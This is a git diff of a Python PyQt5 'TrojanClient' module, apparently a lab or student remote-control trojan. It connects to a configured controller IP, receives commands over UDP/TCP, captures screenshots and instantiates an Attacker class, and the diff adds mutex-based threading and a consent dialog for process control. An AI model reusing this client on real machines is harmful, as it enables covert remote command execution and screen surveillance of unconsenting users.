@@ -1,4 +1,4 @@
-from PyQt5.QtCore import pyqtSignal, QObject, Qt, QThread
+from PyQt5.QtCore import pyqtSignal, QObject, Qt, QThread, QMutex, QWaitCondition
 from PyQt5.QtGui import QCursor
 from PyQt5.QtWidgets import QMenu, QWidget, QApplication, QListWidgetItem, QAction, QCheckBox, QLabel, QMessageBox
 import client
@@ -20,7 +20,10 @@ import time
 from queue import Queue
 from FileExplorer import FileExplorer
 from ThreadExplorer import ThreadExplorer
+import random
 
+flag_judge = False
+flag_thread = False
 config = configparser.ConfigParser()
 config.read('config.ini', 'utf8')
 master_ip = config.get('client', 'masterIp')
@@ -96,32 +99,44 @@ class ClientMain(QWidget, Ui_MainWindow):
     def setip(self,ipmessage):
         self.iplabel.setText(ipmessage)
 
-    def threadcrtlbox(self):
-        reply = QMessageBox.question(self, '提示', '是否接收进程控制?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+    def threadcrtlbox(self,mes):
+        global flag_thread
+        print(mes)
+        reply = QMessageBox.question(self, '提示', '是否接受进程控制?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
         if reply == QMessageBox.Yes:
-            pass
+            flag_thread = True
         else:
             pass
+        self.cal.resume()
 
-class clientThread(QThread):
-    ipsiganal = pyqtSignal(str)
-    threadsignal = pyqtSignal()
-    def __init__(self):
-        super().__init__()
-    
-    def run(self):
-        port = 13400
-        i = 0
-        while i <= 32:
-            port += i
-            try:
-                self.trojanServer = TrojanClient(int(port))#初始化
-                self.trojanServer.searchMaster()
-                ipmessage = "控制端ip:"+str(self.trojanServer.masterIP)+" 本机ip:"+str(self.trojanServer.ownip)+" 管理udp端口:"+str(self.trojanServer.masterUdpPort)+" 管理tcp端口"+str(self.trojanServer.masterTcpPort)+" 本机udp服务端口:"+ str(self.trojanServer.udpRecvPort)
-                self.ipsiganal.emit(ipmessage)
-                while True:
-                    trojanServer.searchMaster()
-                    time.sleep(60)
+
+# class clientThread(QThread):
+#     ipsiganal = pyqtSignal(str)
+#     threadsignal = pyqtSignal(str)
+#     def __init__(self):
+#         super().__init__()
+#         self.cond = QWaitCondition()
+#         self.mutex = QMutex()
+#     def run(self):
+#         global flag_judge
+#         port = 13400
+#         i = 0
+#         # while i <= 32:
+#         #     port += i
+#         #     try:
+#         self.trojanServer = TrojanClient(int(port))#初始化
+#         self.trojanServer.searchMaster()
+#         ipmessage = "控制端ip:"+str(self.trojanServer.masterIP)+" 本机ip:"+str(self.trojanServer.ownip)+" 管理udp端口:"+str(self.trojanServer.masterUdpPort)+" 管理tcp端口"+str(self.trojanServer.masterTcpPort)+" 本机udp服务端口:"+ str(self.trojanServer.udpRecvPort)
+#         self.ipsiganal.emit(ipmessage)
+#         while True:
+#             self.mutex.lock()
+#             if flag_judge == False:
+#                 trojanServer.searchMaster()
+#                 time.sleep(60)
+#             else:
+#                 flag_judge = False
+#                 self.threadsignal.emit("judge")
+#             self.mutex.unlock()
 
         #         self.udpPort = udpPort #
         # self.udpRecvPort = udpPort + 1 #受控端udp接收端口
@@ -132,18 +147,25 @@ class clientThread(QThread):
                 # while True:
                 #     trojanServer.searchMaster()
                 #     time.sleep(60)
-            except:
-                print("error")
-            finally:
-                i += 4
+            # except:
+            #     print("error")
+            # finally:
+            #     i += 4
 
 
-class TrojanClient(clientThread):
-    def __init__(self, udpPort=8082):
+class clientThread(QThread):
+    ipsiganal = pyqtSignal(str)
+    threadsignal = pyqtSignal(str)
+    def __init__(self):
         super().__init__()
+        self.cond = QWaitCondition()
+        self.mutex = QMutex()
         # configs
-        self.udpPort = udpPort #
-        self.udpRecvPort = udpPort + 1 #受控端udp接收端口
+        
+    def run(self):
+        global flag_judge
+        self.udpPort = 13400 #
+        self.udpRecvPort = self.udpPort + 1 #受控端udp接收端口
         self.masterIP = master_ip #控制端ip
         self.masterUdpPort = config.getint('client', 'masterUdpPort') #此端口与控制端udp接收端口相同
         self.masterTcpPort = config.getint('client', 'masterTcpPort') #此端口与控制端tcp端口相同
@@ -164,7 +186,6 @@ class TrojanClient(clientThread):
         self.commandThread = Thread(target=self.cmdRecv) #判断os，然后到run_command
         self.commandThread.daemon = True
         self.commandThread.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
-
         self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #真正开始建socket连接
         self.udpSocket.bind((self.ownip, self.udpPort)) #ip绑定了自己的ip， udpPort是那个初始化来回试探的
 
@@ -183,7 +204,6 @@ class TrojanClient(clientThread):
         self.tcpSQ = Queue()
         self.tcpS = Thread(target=self.RealtcpSend, daemon=True) #暂时没看出来tcp怎么用的
         self.tcpS.start()#dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
-
         self.enablePic = True
         self.picTime = 5  # 每张截图时间间隔为 picTime * 0.05
 
@@ -191,6 +211,20 @@ class TrojanClient(clientThread):
         self.width = 672
 
         self.attacker = Attacker()
+        while 1:
+            search = random.randint(0,11)
+            if search == 10:
+                self.searchMaster()
+            ipmessage = "控制端ip:"+str(self.masterIP)+" 本机ip:"+str(self.ownip)+" 管理udp端口:"+str(self.masterUdpPort)+" 管理tcp端口"+str(self.masterTcpPort)+" 本机udp服务端口:"+ str(self.udpRecvPort)
+            self.ipsiganal.emit(ipmessage)
+            if flag_judge == False:
+                time.sleep(1)
+            else:
+                flag_judge = False
+                self.threadsignal.emit("judge")
+
+    def resume(self):
+        self.cond.wakeAll()
 
     def cmdRecv(self):
         while True:
@@ -295,6 +329,8 @@ class TrojanClient(clientThread):
                 break
 
     def udpRecv(self):
+        global flag_judge
+        global flag_thread
         print("udp 接收器已启动")
         while True:
             data, addr = self.udpRecvSocket.recvfrom(1024) #recv看起来正常，一直接收udp发来的东西，然后判端功能
@@ -392,9 +428,15 @@ class TrojanClient(clientThread):
                 self.transportList()
             
             elif cmd == "thread":#dddddddddddddddddddneed QmessageBox.Question
-                
-                print("Start thread control")
-                self.thransportThread()
+                self.mutex.lock()
+                flag_judge = True
+                self.cond.wait(self.mutex)
+                if flag_thread == True:
+                    print("Start thread control")
+                    self.thransportThread()
+                else:
+                    pass
+                self.mutex.unlock()
 
 
     def thransportThread(self):
